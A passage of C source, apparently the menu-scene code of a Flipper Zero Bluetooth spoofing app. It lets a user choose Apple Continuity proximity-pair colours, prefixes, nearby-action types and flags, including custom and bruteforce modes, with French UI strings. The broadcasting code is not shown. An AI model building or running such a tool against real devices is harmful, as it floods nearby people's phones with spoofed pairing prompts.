        cfg->data.proximity_pair.bruteforce_mode == ContinuityPpBruteforceColor)) {
        for(; model_index < pp_models_count; model_index++) {
            if(cfg->data.proximity_pair.model == pp_models[model_index].value) {
                colors_count = pp_models[model_index].colors_count;
                break;
            }
        }
    }
    if(index == colors_count) {
        scene_manager_next_scene(ctx->scene_manager, SceneContinuityPpColorCustom);
    } else if(index == colors_count + 1U) {
        payload->mode = PayloadModeBruteforce;
        payload->bruteforce.counter = 0;
        payload->bruteforce.value = cfg->data.proximity_pair.color;
        payload->bruteforce.size = 1;
        cfg->data.proximity_pair.bruteforce_mode = ContinuityPpBruteforceColor;
        scene_manager_previous_scene(ctx->scene_manager);
    } else {
        if(payload->mode != PayloadModeBruteforce ||
           cfg->data.proximity_pair.bruteforce_mode == ContinuityPpBruteforceColor)
            payload->mode = PayloadModeValue;
        cfg->data.proximity_pair.color = pp_models[model_index].colors[index].value;
        scene_manager_previous_scene(ctx->scene_manager);
    }
}
void scene_continuity_pp_color_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    Submenu* submenu = ctx->submenu;
    uint32_t selected = 0;
    bool value = payload->mode == PayloadModeValue ||
                 (payload->mode == PayloadModeBruteforce &&
                  cfg->data.proximity_pair.bruteforce_mode != ContinuityPpBruteforceColor);

    bool found = false;
    uint8_t colors_count = 0;
    if(payload->mode == PayloadModeValue ||
       (payload->mode == PayloadModeBruteforce &&
        cfg->data.proximity_pair.bruteforce_mode == ContinuityPpBruteforceColor)) {
        for(uint8_t i = 0; i < pp_models_count; i++) {
            if(cfg->data.proximity_pair.model == pp_models[i].value) {
                colors_count = pp_models[i].colors_count;
                for(uint8_t j = 0; j < colors_count; j++) {
                    submenu_add_item(
                        submenu, pp_models[i].colors[j].name, j, pp_color_callback, ctx);
                    if(!found && value &&
                       cfg->data.proximity_pair.color == pp_models[i].colors[j].value) {
                        found = true;
                        selected = j;
                    }
                }
                break;
            }
        }
    }
    submenu_add_item(submenu, "Custom", colors_count, pp_color_callback, ctx);
    if(!found && value) {
        selected = colors_count;
    }

    submenu_add_item(submenu, "Bruteforce", colors_count + 1, pp_color_callback, ctx);
    if(!value && payload->mode == PayloadModeBruteforce) {
        selected = colors_count + 1;
    }

    submenu_set_selected_item(submenu, selected);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
}
bool scene_continuity_pp_color_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_continuity_pp_color_on_exit(void* _ctx) {
    Ctx* ctx = _ctx;
    submenu_reset(ctx->submenu);
}

static void pp_color_custom_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    if(payload->mode != PayloadModeBruteforce ||
       cfg->data.proximity_pair.bruteforce_mode == ContinuityPpBruteforceColor)
        payload->mode = PayloadModeValue;
    cfg->data.proximity_pair.color = (ctx->byte_store[0] << 0x00);
    scene_manager_previous_scene(ctx->scene_manager);
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_continuity_pp_color_custom_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    ByteInput* byte_input = ctx->byte_input;

    byte_input_set_header_text(byte_input, "Entrez couleur perso");

    ctx->byte_store[0] = (cfg->data.proximity_pair.color >> 0x00) & 0xFF;

    byte_input_set_result_callback(
        byte_input, pp_color_custom_callback, NULL, ctx, (void*)ctx->byte_store, 1);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
}
bool scene_continuity_pp_color_custom_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_continuity_pp_color_custom_on_exit(void* _ctx) {
    UNUSED(_ctx);
}

static void pp_prefix_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    switch(index) {
    case 0:
        cfg->data.proximity_pair.prefix = 0x00;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    case pp_prefixes_count + 1:
        scene_manager_next_scene(ctx->scene_manager, SceneContinuityPpPrefixCustom);
        break;
    default:
        cfg->data.proximity_pair.prefix = pp_prefixes[index - 1].value;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    }
}
void scene_continuity_pp_prefix_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    Submenu* submenu = ctx->submenu;
    uint32_t selected = 0;
    bool found = false;

    submenu_add_item(submenu, "Automatic", 0, pp_prefix_callback, ctx);
    if(cfg->data.proximity_pair.prefix == 0x00) {
        found = true;
        selected = 0;
    }

    for(uint8_t i = 0; i < pp_prefixes_count; i++) {
        submenu_add_item(submenu, pp_prefixes[i].name, i + 1, pp_prefix_callback, ctx);
        if(!found && cfg->data.proximity_pair.prefix == pp_prefixes[i].value) {
            found = true;
            selected = i + 1;
        }
    }
    submenu_add_item(submenu, "Custom", pp_prefixes_count + 1, pp_prefix_callback, ctx);
    if(!found) {
        selected = pp_prefixes_count + 1;
    }

    submenu_set_selected_item(submenu, selected);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
}
bool scene_continuity_pp_prefix_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_continuity_pp_prefix_on_exit(void* _ctx) {
    Ctx* ctx = _ctx;
    submenu_reset(ctx->submenu);
}

static void pp_prefix_custom_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    cfg->data.proximity_pair.prefix = (ctx->byte_store[0] << 0x00);
    scene_manager_previous_scene(ctx->scene_manager);
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_continuity_pp_prefix_custom_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    ByteInput* byte_input = ctx->byte_input;

    byte_input_set_header_text(byte_input, "Entrez prefix perso");

    ctx->byte_store[0] = (cfg->data.proximity_pair.prefix >> 0x00) & 0xFF;

    byte_input_set_result_callback(
        byte_input, pp_prefix_custom_callback, NULL, ctx, (void*)ctx->byte_store, 1);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
}
bool scene_continuity_pp_prefix_custom_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_continuity_pp_prefix_custom_on_exit(void* _ctx) {
    UNUSED(_ctx);
}

static void na_action_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    switch(index) {
    case 0:
        payload->mode = PayloadModeRandom;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    case na_actions_count + 1:
        scene_manager_next_scene(ctx->scene_manager, SceneContinuityNaActionCustom);
        break;
    case na_actions_count + 2:
        payload->mode = PayloadModeBruteforce;
        payload->bruteforce.counter = 0;
        payload->bruteforce.value = cfg->data.nearby_action.action;
        payload->bruteforce.size = 1;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    default:
        payload->mode = PayloadModeValue;
        cfg->data.nearby_action.action = na_actions[index - 1].value;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    }
}
void scene_continuity_na_action_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    Submenu* submenu = ctx->submenu;
    uint32_t selected = 0;

    submenu_add_item(submenu, "Random", 0, na_action_callback, ctx);
    if(payload->mode == PayloadModeRandom) {
        selected = 0;
    }

    bool found = false;
    for(uint8_t i = 0; i < na_actions_count; i++) {
        submenu_add_item(submenu, na_actions[i].name, i + 1, na_action_callback, ctx);
        if(!found && payload->mode == PayloadModeValue &&
           cfg->data.nearby_action.action == na_actions[i].value) {
            found = true;
            selected = i + 1;
        }
    }
    submenu_add_item(submenu, "Custom", na_actions_count + 1, na_action_callback, ctx);
    if(!found && payload->mode == PayloadModeValue) {
        selected = na_actions_count + 1;
    }

    submenu_add_item(submenu, "Bruteforce", na_actions_count + 2, na_action_callback, ctx);
    if(payload->mode == PayloadModeBruteforce) {
        selected = na_actions_count + 2;
    }

    submenu_set_selected_item(submenu, selected);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
}
bool scene_continuity_na_action_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_continuity_na_action_on_exit(void* _ctx) {
    Ctx* ctx = _ctx;
    submenu_reset(ctx->submenu);
}

static void na_action_custom_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    payload->mode = PayloadModeValue;
    cfg->data.nearby_action.action = (ctx->byte_store[0] << 0x00);
    scene_manager_previous_scene(ctx->scene_manager);
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_continuity_na_action_custom_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    ByteInput* byte_input = ctx->byte_input;

    byte_input_set_header_text(byte_input, "Entrez une action personnalis""\xE9");

    ctx->byte_store[0] = (cfg->data.nearby_action.action >> 0x00) & 0xFF;

    byte_input_set_result_callback(
        byte_input, na_action_custom_callback, NULL, ctx, (void*)ctx->byte_store, 1);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
}
bool scene_continuity_na_action_custom_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_continuity_na_action_custom_on_exit(void* _ctx) {
    UNUSED(_ctx);
}

static void na_flags_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_continuity_na_flags_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    ByteInput* byte_input = ctx->byte_input;

    byte_input_set_header_text(byte_input, "Retour pour auto");

    ctx->byte_store[0] = (cfg->data.nearby_action.flags >> 0x00) & 0xFF;

    byte_input_set_result_callback(
        byte_input, na_flags_callback, NULL, ctx, (void*)ctx->byte_store, 1);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
}
bool scene_continuity_na_flags_on_event(void* _ctx, SceneManagerEvent event) {
    Ctx* ctx = _ctx;
    if(event.type == SceneManagerEventTypeBack) {
        ctx->byte_store[0] = 0x00;
    }
    return false;
}
void scene_continuity_na_flags_on_exit(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    cfg->data.nearby_action.flags = (ctx->byte_store[0] << 0x00);
}
